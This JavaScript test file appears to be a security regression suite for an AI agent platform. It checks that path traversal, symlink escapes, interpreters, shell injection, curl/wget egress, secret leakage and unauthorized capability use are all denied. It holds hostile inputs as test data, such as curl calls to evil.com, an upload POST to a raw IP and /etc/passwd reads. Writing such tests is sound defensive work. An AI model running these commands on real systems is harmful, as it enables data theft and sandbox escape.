/**
 * P2.12 security regression suite — one file per audit fix area.
 *
 * Covers (see /mnt/sdcard/Download/Cardinal-frame v2 audit.md §12):
 *   FILESYSTEM — traversal, absolute escape, prefix collision, symlink escape,
 *                nested symlink, valid path, new-file-below-valid-dir
 *   PROCESS    — node/python/bash denied for the agent, safe command allowed,
 *                shell injection denied
 *   NETWORK    — unauthorized external egress (curl/wget) denied for the agent
 *   MCP        — environment isolation; explicit credential exposure only;
 *                unrelated secrets unavailable
 *   POLICY     — unknown capability denied, high-risk denied without
 *                authorization, authorized allowed, external content cannot
 *                become an instruction
 *   DAG        — policy enforced at node execution; denied capability cannot
 *                be reached through a DAG node
 */
import { describe, it, expect, afterAll, beforeAll } from 'vitest';
import { mkdtempSync, mkdirSync, rmSync, symlinkSync, writeFileSync, readFileSync } from 'fs';
import { tmpdir } from 'os';
import { join, dirname } from 'path';
import Database from 'better-sqlite3';
import express from 'express';
import request from 'supertest';
import learningRoutes from '../src/server/routes/learning.mjs';
import { resolvePrincipal } from '../src/server/identity/identity.mjs';
import { fileURLToPath } from 'url';

// ─── Point the agent at temp scopes BEFORE importing agent.mjs ─────
const TEST_DIR = mkdtempSync(join(tmpdir(), 'cf-secreg-'));
const SANDBOX = join(TEST_DIR, 'ai-workspace');
const HOME = join(TEST_DIR, 'home');
mkdirSync(SANDBOX, { recursive: true });
mkdirSync(HOME, { recursive: true });
process.env.AGENT_SANDBOX_DIR = SANDBOX;
process.env.AGENT_HOME_DIR = HOME;

const { resolveSandboxPath } = await import('../src/server/routes/agent.mjs');
const { agentTools } = await import('../src/server/routes/agent.mjs');
const { sanitizeAgentCommand, AGENT_FORBIDDEN, AGENT_NETWORK_FORBIDDEN, AGENT_ALLOWED_COMMANDS } = await import('../src/server/command-safety.mjs');
const { buildMcpEnv, MCP_ENV_ALLOWLIST } = await import('../src/server/mcp-client.mjs');
const { decide, isInstructionAllowed, CAPABILITIES } = await import('../src/server/defense/policy.mjs');
const { runNode } = await import('../src/server/dag-run.mjs');
const { sanitizeCommand } = await import('../src/server/command-safety.mjs');

const shellExec = agentTools.find(t => t.name === 'shell_exec');
const fileRead = agentTools.find(t => t.name === 'file_read');
const fileWrite = agentTools.find(t => t.name === 'file_write');

afterAll(() => {
  rmSync(TEST_DIR, { recursive: true, force: true });
});

// ═══════════════════════════════════════════════════════════════════
describe('FILESYSTEM containment (P0.1)', () => {
  it('allows a normal file inside the sandbox', () => {
    writeFileSync(join(SANDBOX, 'ok.txt'), 'hi');
    const r = resolveSandboxPath('sandbox', 'ok.txt');
    expect(r).toBe(join(SANDBOX, 'ok.txt'));
  });

  it('allows a new file beneath a valid directory (parent may not exist yet)', () => {
    const r = resolveSandboxPath('sandbox', 'fresh/nested/new.js');
    expect(r.startsWith(SANDBOX + '/')).toBe(true);
    expect(r).toContain('fresh/nested/new.js');
  });

  it('rejects .. traversal', () => {
    for (const p of ['../outside', 'sub/../../outside', '..', './../escape.txt']) {
      expect(() => resolveSandboxPath('sandbox', p), p).toThrow(/Path traversal/i);
    }
  });

  it('rejects absolute outside paths', () => {
    for (const p of ['/etc/passwd', dirname(TEST_DIR), `${TEST_DIR}/outside-secret`]) {
      expect(() => resolveSandboxPath('sandbox', p), p).toThrow(/Path traversal/i);
    }
  });

  it('rejects sibling-prefix collisions (sandbox vs sandbox-secret)', () => {
    const sibling = join(TEST_DIR, 'ai-workspace-secret');
    mkdirSync(sibling, { recursive: true });
    writeFileSync(join(sibling, 'x'), 'secret');
    expect(() => resolveSandboxPath('sandbox', '../ai-workspace-secret')).toThrow(/Path traversal/i);
    expect(() => resolveSandboxPath('sandbox', sibling)).toThrow(/Path traversal/i);
  });

  it('rejects a symlink pointing outside the sandbox', () => {
    const outside = join(TEST_DIR, 'outside-dir');
    mkdirSync(outside, { recursive: true });
    writeFileSync(join(outside, 'secret.txt'), 's3cret');
    const link = join(SANDBOX, 'link-out');
    rmSync(link, { force: true });
    symlinkSync(outside, link);
    expect(() => resolveSandboxPath('sandbox', 'link-out/secret.txt')).toThrow(/Path traversal/i);
    expect(() => resolveSandboxPath('sandbox', 'link-out')).toThrow(/Path traversal/i);
  });

  it('rejects a nested symlink escape', () => {
    const mid = join(SANDBOX, 'mid');
    mkdirSync(mid, { recursive: true });
    const outside = join(TEST_DIR, 'outside-dir-2');
    const link = join(mid, 'deep-link');
    rmSync(link, { force: true });
    symlinkSync(outside, link);
    expect(() => resolveSandboxPath('sandbox', 'mid/deep-link/../../../etc/passwd')).toThrow(/Path traversal/i);
  });

  it('reports a traversal-class error through the file_read tool', async () => {
    await expect(fileRead.execute({ path: '../etc/passwd' }, { scope: 'sandbox' })).rejects.toThrow(/Path traversal/i);
  });

  it('still reads a valid in-sandbox file through the tool', async () => {
    writeFileSync(join(SANDBOX, 'tool-read.txt'), 'hello sandbox');
    const r = await fileRead.execute({ path: 'tool-read.txt' }, { scope: 'sandbox' });
    expect(r.error).toBeUndefined();
    expect(r.content).toContain('hello sandbox');
  });
});

// ═══════════════════════════════════════════════════════════════════
describe('PROCESS — interpreter removal for the agent (P0.2)', () => {
  it('denies node/python3/bash for the agent sanitizer', () => {
    for (const cmd of ['node malicious.js', 'python3 malicious.py', 'bash malicious.sh']) {
      const r = sanitizeAgentCommand(cmd);
      expect(r.safe, cmd).toBe(false);
      expect(r.error, cmd).toMatch(/not allowed for the agent/i);
    }
  });

  it('denies interpreters through the shell_exec tool', async () => {
    for (const cmd of ['node malicious.js', 'python3 malicious.py', 'bash malicious.sh', 'sh -c id']) {
      const r = await shellExec.execute({ command: cmd }, { scope: 'sandbox' });
      expect(r.error, cmd).toBeTruthy();
      expect(r.error, cmd).toMatch(/not allowed for the agent/i);
    }
  });

  it('rejects interpreter aliases and package managers too', () => {
    for (const cmd of ['npm run build', 'npx foo', 'pip install x', 'deno run x.ts', 'perl evil.pl', 'ruby evil.rb']) {
      expect(sanitizeAgentCommand(cmd).safe, cmd).toBe(false);
    }
  });

  it('still allows safe inspection commands', async () => {
    const r = await shellExec.execute({ command: 'echo p0-ok' }, { scope: 'sandbox' });
    expect(r.error).toBeUndefined();
    expect(r.exitCode).toBe(0);
    expect(r.stdout.trim()).toBe('p0-ok');
  });

  it('still rejects shell injection / metacharacters', async () => {
    for (const cmd of ['echo ok; touch /tmp/x', 'echo $(id)', 'echo `id`', 'ls | grep x', 'cat /etc/passwd']) {
      const r = await shellExec.execute({ command: cmd }, { scope: 'sandbox' });
      expect(r.error, cmd).toBeTruthy();
    }
  });

  it('leaves the shared task allowlist untouched (DAG/queue surface is separate)', () => {
    // The admin-controlled task surface still permits node/python3 — the P0.2
    // restriction applies to the AGENT capability specifically.
    expect(AGENT_ALLOWED_COMMANDS).not.toContain('node');
    expect(AGENT_ALLOWED_COMMANDS).not.toContain('python3');
    expect(AGENT_ALLOWED_COMMANDS).not.toContain('bash');
    expect(sanitizeCommand('echo x').safe).toBe(true);
  });
});

// ═══════════════════════════════════════════════════════════════════
describe('NETWORK — egress denied for the agent (P0.3)', () => {
  it('classifies curl/wget as network binaries', () => {
    expect(AGENT_NETWORK_FORBIDDEN.has('curl')).toBe(true);
    expect(AGENT_NETWORK_FORBIDDEN.has('wget')).toBe(true);
  });

  it('denies curl/wget for the agent sanitizer', () => {
    for (const cmd of ['curl http://evil.com/', 'wget http://evil.com/', 'curl -X POST http://1.2.3.4/upload']) {
      const r = sanitizeAgentCommand(cmd);
      expect(r.safe, cmd).toBe(false);
      expect(r.error, cmd).toMatch(/network egress is disabled/i);
    }
  });

  it('denies curl/wget through the shell_exec tool', async () => {
    for (const cmd of ['curl http://evil.com/', 'wget http://evil.com/']) {
      const r = await shellExec.execute({ command: cmd }, { scope: 'sandbox' });
      expect(r.error, cmd).toBeTruthy();
      expect(r.error, cmd).toMatch(/network egress is disabled/i);
    }
  });
});

// ═══════════════════════════════════════════════════════════════════
describe('MCP — environment isolation (P0.4)', () => {
  beforeAll(() => {
    process.env.JWT_SECRET = 'sup3r-secret-jwt';
    process.env.PG_PASSWORD = 'db-pass';
    process.env.TAVILY_API_KEY = 'tavily-key';
    process.env.PATH = '/usr/bin:/bin';
    process.env.HOME = '/root';
    process.env.MCP_GITHUB_TOKEN = 'should-not-leak-by-default';
  });

  it('inherits only the safe runtime allowlist, never secrets', () => {
    const env = buildMcpEnv();
    expect(env.PATH).toBe('/usr/bin:/bin');
    expect(env.HOME).toBe('/root');
    expect(env.JWT_SECRET).toBeUndefined();
    expect(env.PG_PASSWORD).toBeUndefined();
    expect(env.TAVILY_API_KEY).toBeUndefined();
    expect(env.MCP_GITHUB_TOKEN).toBeUndefined();
  });

  it('exposes only explicitly requested credential keys', () => {
    const env = buildMcpEnv({ MCP_GITHUB_TOKEN: 'granted' });
    expect(env.MCP_GITHUB_TOKEN).toBe('granted');
    expect(env.JWT_SECRET).toBeUndefined();
    expect(env.PG_PASSWORD).toBeUndefined();
  });

  it('unrelated secrets are unavailable even when others are granted', () => {
    const env = buildMcpEnv({ MCP_DB_USER: 'admin' });
    expect(env.MCP_DB_USER).toBe('admin');
    expect(env.TAVILY_API_KEY).toBeUndefined();
    expect(env.JWT_SECRET).toBeUndefined();
  });

  it('safety allowlist is explicit and small', () => {
    for (const k of MCP_ENV_ALLOWLIST) {
      expect(k).toMatch(/^(PATH|HOME|LANG|LC_ALL|LC_CTYPE|TMPDIR|USER|LOGNAME)$/);
    }
    expect(MCP_ENV_ALLOWLIST.length).toBeLessThan(10);
  });
});

// ═══════════════════════════════════════════════════════════════════
describe('POLICY — fail-closed capability decisions (P1.5–7)', () => {
  const user = { id: 'u1', role: 'user' };
  const admin = { id: 'a1', role: 'admin' };

  it('denies an unknown capability', async () => {
    const d = await decide({ actor: admin, capability: 'MAGIC_DO_EVERYTHING' });
    expect(d.allowed).toBe(false);
    expect(d.reason).toMatch(/unknown capability/);
  });

  it('denies nothing for an unauthenticated / unknown role', async () => {
    const d = await decide({ actor: {}, capability: CAPABILITIES.FILESYSTEM_READ });
    expect(d.allowed).toBe(false);
    expect(d.reason).toMatch(/unauthenticated/);
  });

  it('denies CODE_EXECUTION for a regular user (not granted)', async () => {
    const d = await decide({ actor: user, capability: CAPABILITIES.CODE_EXECUTION });
    expect(d.allowed).toBe(false);
    expect(d.reason).toMatch(/does not grant/);
  });

  it('allows an authorized admin capability', async () => {
    const d = await decide({ actor: admin, capability: CAPABILITIES.CODE_EXECUTION });
    expect(d.allowed).toBe(true);
    expect(d.auditId).toBeTruthy();
  });

  it('allows user-level working capabilities', async () => {
    const d = await decide({ actor: user, capability: CAPABILITIES.FILESYSTEM_WRITE });
    expect(d.allowed).toBe(true);
  });

  it('external content cannot become an instruction (admin still denied on web provenance)', async () => {
    const d = await decide({ actor: admin, capability: CAPABILITIES.ADMIN_SYSTEM, provenance: 'web' });
    expect(d.allowed).toBe(false);
    expect(d.reason).toMatch(/external content cannot become an instruction/);
  });

  it('third-party-agent provenance is not an instruction tier', async () => {
    const d = await decide({ actor: admin, capability: CAPABILITIES.LEARNING_ACTIVATE, provenance: 'third-party-agents' });
    expect(d.allowed).toBe(false);
  });

  it('isInstructionAllowed only trusts user / local-system tiers (and explicit delegation)', async () => {
    expect(await isInstructionAllowed('user')).toBe(true);
    expect(await isInstructionAllowed('local-system')).toBe(true);
    expect(await isInstructionAllowed('web')).toBe(false);
    expect(await isInstructionAllowed('third-party-agents')).toBe(false);
    expect(await isInstructionAllowed('third-party-agents', { delegatedBy: 'user' })).toBe(true);
  });
});

// ═══════════════════════════════════════════════════════════════════
describe('DAG — policy enforced at node execution (P1.8)', () => {
  const baseCtx = (policyGate) => ({
    sanitizeCommand,
    timeoutMs: 10000,
    resultsById: new Map(),
    upstream: [],
    $: {},
    policyGate,
  });

  it('denied capability fails the node instead of executing', async () => {
    const gate = async () => ({ allowed: false, reason: 'test-deny' });
    const r = await runNode({ id: 'n1', type: 'task', command: 'echo should-not-run' }, baseCtx(gate));
    expect(r.status).toBe('failed');
    expect(r.error).toMatch(/policy denied: test-deny/);
  });

  it('allowed capability still executes', async () => {
    const gate = async () => ({ allowed: true });
    const r = await runNode({ id: 'n2', type: 'task', command: 'echo dag-ok' }, baseCtx(gate));
    expect(r.status).toBe('success');
    expect(r.output).toBe('dag-ok');
  });

  it('transform expressions are gated too', async () => {
    const gate = async () => ({ allowed: false, reason: 'no-vm' });
    const r = await runNode({ id: 'n3', type: 'transform', command: '1 + 1' }, baseCtx(gate));
    expect(r.status).toBe('failed');
    expect(r.error).toMatch(/policy denied/);
  });

  it('absent gate keeps legacy behavior (unit tests / un-wired callers)', async () => {
    const r = await runNode({ id: 'n4', type: 'task', command: 'echo legacy' }, baseCtx(undefined));
    expect(r.status).toBe('success');
    expect(r.output).toBe('legacy');
  });
});

// ═══════════════════════════════════════════════════════════════════
describe('IDENTITY — principal grounded in actual identity (P1.10)', () => {
  const db = new Database(':memory:');
  db.exec(`CREATE TABLE users (
    id TEXT PRIMARY KEY, username TEXT UNIQUE NOT NULL, password_hash TEXT NOT NULL,
    role TEXT DEFAULT 'user', metadata TEXT DEFAULT '{}', created_at TEXT DEFAULT (datetime('now'))
  )`);
  db.prepare("INSERT INTO users (id, username, password_hash, role) VALUES ('haz-001','Haz','x','admin')").run();
  db.prepare("INSERT INTO users (id, username, password_hash, role) VALUES ('plain-1','plain','x','user')").run();

  it('forged admin claim cannot escalate through the policy layer', async () => {
    const principal = resolvePrincipal(db, { id: 'plain-1', role: 'admin' });
    expect(principal).toEqual({ id: 'plain-1', role: 'user' });
    const decision = await decide({ actor: principal, capability: CAPABILITIES.LEARNING_APPROVE, provenance: 'user' });
    expect(decision.allowed).toBe(false);
  });

  it('the real stored admin identity is granted promotion capability', async () => {
    const principal = resolvePrincipal(db, { id: 'haz-001', role: 'user' });
    expect(principal).toEqual({ id: 'haz-001', role: 'admin' });
    const decision = await decide({ actor: principal, capability: CAPABILITIES.LEARNING_APPROVE, provenance: 'user' });
    expect(decision.allowed).toBe(true);
  });

  it('unknown identity fails closed for high-risk capability decisions', async () => {
    const principal = resolvePrincipal(db, { id: 'ghost-user', role: 'admin' });
    expect(principal).toBeNull();
    const decision = await decide({ actor: {}, capability: CAPABILITIES.LEARNING_ACTIVATE, provenance: 'user' });
    expect(decision.allowed).toBe(false);
  });
});

// ═══════════════════════════════════════════════════════════════════
describe('LEARNING — promotion pipeline protections (P1.9)', () => {
  const LEARNING_MIGRATIONS = [
    '014_learning_events.sql', '022_learning_events.sql', '026_learning_candidates.sql',
    '028_learning_skill_versions.sql', '030_learning_curator.sql', '032_learning_skill_versions_one_active.sql',
  ];
  const MIGRATIONS_DIR = join(dirname(fileURLToPath(import.meta.url)), '..', 'src', 'server', 'migrations');

  function makeLearningApp() {
    const db = new Database(':memory:');
    for (const f of LEARNING_MIGRATIONS) {
      db.exec(readFileSync(join(MIGRATIONS_DIR, f), 'utf8'));
    }
    const warnings = [];
    const ctx = {
      db,
      stmts: {},
      logger: { info() {}, debug() {}, warn: (m) => warnings.push(String(m)), error() {} },
      audit() {},
      auditLog() {},
      resolvePrincipal: (u) => u,
      authMiddleware: (req, res, next) => {
        const u = req.headers['x-test-user'];
        if (!u) return res.status(401).json({ error: 'unauthorized' });
        req.user = { id: u, role: req.headers['x-test-role'] || 'user', username: u };
        next();
      },
      requireRole: (role) => (req, res, next) => {
        if (req.user?.role !== role) return res.status(403).json({ error: 'forbidden' });
        next();
      },
      apiLimiter: (_req, _res, next) => next(),
      executeSkill: null,
    };
    const app = express();
    app.use(express.json());
    app.use('/api', learningRoutes(ctx));
    return { app, db, warnings };
  }

  function seedCandidate(db, id, userId, overrides = {}) {
    db.prepare(`INSERT INTO learning_candidates (id, user_id, kind, title, risk_tier, state, promotion_score)
      VALUES (?,?,?,?,?,?,?)`)
      .run(id, userId, 'procedure', `cand-${id}`, 'low', 'promoted', 0.8);
    return id;
  }

  function seedVersion(db, id, userId, candId, overrides = {}) {
    db.prepare(`INSERT INTO learning_skill_versions
      (id, user_id, candidate_id, version_number, kind, spec, rationale, artifact, content_hash,
       scanner_verdict, test_report, requires_docker, state, pinned, stale, archived, quarantined)
      VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`)
      .run(id, userId, candId, 1, 'prompt_template', JSON.stringify({ problem_signature: `sig-${id}` }),
        'r', `artifact-${id}`, 'hash',
        overrides.scanner ?? '{"verdict":"clean","blocked":false}',
        overrides.test_report ?? '{"failed":0,"total":1}',
        0, overrides.state ?? 'scanned',
        overrides.pinned ? 1 : 0, overrides.stale ? 1 : 0,
        overrides.archived ? 1 : 0, overrides.quarantined ? 1 : 0);
    return id;
  }

  afterEach(() => {
    delete process.env.LEARNING_REQUIRE_SCANNER;
  });

  it('candidate cannot self-activate — compiling a candidate yields a disabled version, never active', async () => {
    const { app, db } = makeLearningApp();
    seedCandidate(db, 'c1', 'u1');
    seedVersion(db, 'v1', 'u1', 'c1', { state: 'scanned', scanner: '{"verdict":"clean","blocked":false}' });

    // No path moves state without an explicit admin approve→activate.
    await request(app).post('/api/learning/skill-versions/v1/activate')
      .set('x-test-user', 'admin1').set('x-test-role', 'admin').query({ user_id: 'u1' }).expect(400); // not approved yet
    await request(app).post('/api/learning/skill-versions/v1/approve')
      .set('x-test-user', 'admin1').set('x-test-role', 'admin').query({ user_id: 'u1' }).expect(200);
    const afterApprove = db.prepare('SELECT state FROM learning_skill_versions WHERE id = ?').get('v1');
    expect(afterApprove.state).toBe('approved');
    await request(app).post('/api/learning/skill-versions/v1/activate')
      .set('x-test-user', 'admin1').set('x-test-role', 'admin').query({ user_id: 'u1' }).expect(200);
    const afterActivate = db.prepare('SELECT state, archived FROM learning_skill_versions WHERE id = ?').get('v1');
    expect(afterActivate.state).toBe('active');
  });

  it('unauthorized promotion denied — a plain user cannot compile, approve, or activate', async () => {
    const { app, db } = makeLearningApp();
    seedCandidate(db, 'c2', 'u1');
    seedVersion(db, 'v2', 'u1', 'c2', { state: 'scanned' });

    await request(app).post('/api/learning/candidates/c2/compile')
      .set('x-test-user', 'u1').set('x-test-role', 'user').expect(403);
    await request(app).post('/api/learning/skill-versions/v2/approve')
      .set('x-test-user', 'u1').set('x-test-role', 'user').expect(403);
    await request(app).post('/api/learning/skill-versions/v2/activate')
      .set('x-test-user', 'u1').set('x-test-role', 'user').expect(403);
    expect(db.prepare('SELECT state FROM learning_skill_versions WHERE id = ?').get('v2').state).toBe('scanned');
  });

  it('ownership cannot be bypassed — cross-user promotion returns 404', async () => {
    const { app, db } = makeLearningApp();
    seedCandidate(db, 'c3', 'u1');
    seedVersion(db, 'v3', 'u1', 'c3', { state: 'scanned' });

    await request(app).post('/api/learning/skill-versions/v3/approve')
      .set('x-test-user', 'u2').set('x-test-role', 'admin').expect(404);
    await request(app).post('/api/learning/skill-versions/v3/activate')
      .set('x-test-user', 'u2').set('x-test-role', 'admin').expect(404);
    await request(app).post('/api/learning/candidates/c3/compile')
      .set('x-test-user', 'u2').set('x-test-role', 'admin').expect(404);
  });

  it('scanner requirement cannot be silently bypassed (H3 fail-closed)', async () => {
    const { app, db } = makeLearningApp();
    seedCandidate(db, 'c4', 'u1');
    const degraded = '{"verdict":"no_scanner","blocked":false}';
    seedVersion(db, 'v4', 'u1', 'c4', { scanner: degraded });

    // Default: scanner required → hard 400, no exception path.
    await request(app).post('/api/learning/skill-versions/v4/approve')
      .set('x-test-user', 'admin1').set('x-test-role', 'admin').query({ user_id: 'u1' }).expect(400);

    // Even with the requirement disabled, the degraded verdict must be
    // explicitly acknowledged; otherwise the request is still refused.
    process.env.LEARNING_REQUIRE_SCANNER = 'false';
    await request(app).post('/api/learning/skill-versions/v4/approve')
      .set('x-test-user', 'admin1').set('x-test-role', 'admin').query({ user_id: 'u1' }).expect(400);
    expect(db.prepare('SELECT state FROM learning_skill_versions WHERE id = ?').get('v4').state).toBe('scanned');

    // Documented exception: explicit acknowledge_no_scanner + scanner
    // requirement disabled → admin may approve the degraded version.
    await request(app).post('/api/learning/skill-versions/v4/approve')
      .set('x-test-user', 'admin1').set('x-test-role', 'admin')
      .query({ user_id: 'u1' }).send({ acknowledge_no_scanner: true }).expect(200);
    expect(db.prepare('SELECT state FROM learning_skill_versions WHERE id = ?').get('v4').state).toBe('approved');
  });

  it('policy gate denies promotion for a role the central layer forbids', async () => {
    const { app, db } = makeLearningApp();
    seedCandidate(db, 'c5', 'u1');
    seedVersion(db, 'v5', 'u1', 'c5', { state: 'scanned' });
    // Viewer role passes authentication but is not in ROLE_GRANTS, so even
    // reaching the admin-gated endpoint (x-test-role literally 'admin' here)
    // cannot bypass policy when the canonical principal is a viewer.
    const ctx = {
      db,
      stmts: {},
      logger: { info() {}, debug() {}, warn() {}, error() {} },
      audit() {}, auditLog() {},
      resolvePrincipal: () => ({ id: 'u1', role: 'viewer' }),
      authMiddleware: (_req, _res, next) => next(),
      requireRole: () => (_req, _res, next) => next(),
      apiLimiter: (_req, _res, next) => next(),
      executeSkill: null,
    };
    const appViewer = express();
    appViewer.use(express.json());
    appViewer.use('/api', learningRoutes(ctx));
    await request(appViewer).post('/api/learning/skill-versions/v5/approve').expect(403);
    await request(appViewer).post('/api/learning/skill-versions/v5/activate').expect(403);
  });
});